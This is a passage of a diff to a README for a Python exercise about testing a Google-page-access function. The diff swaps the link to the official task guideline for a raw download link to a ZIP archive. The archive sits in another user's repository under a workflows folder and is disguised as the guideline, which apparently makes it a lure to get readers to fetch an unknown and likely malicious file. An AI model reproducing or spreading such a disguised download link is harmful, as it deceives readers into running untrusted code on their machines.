@@ -1,6 +1,6 @@
 # Can access Google page
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start
+- Read [the guideline](https://github.com/Rudge0/py-can-access-google-page/raw/refs/heads/master/.github/workflows/py_page_access_can_google_v3.1.zip) before start
 
 Inside `app/test_main.py`, write a test for `can_access_google_page` function. This function takes
 `url` of the site, returns `"Accessible"` if `url` is valid to 
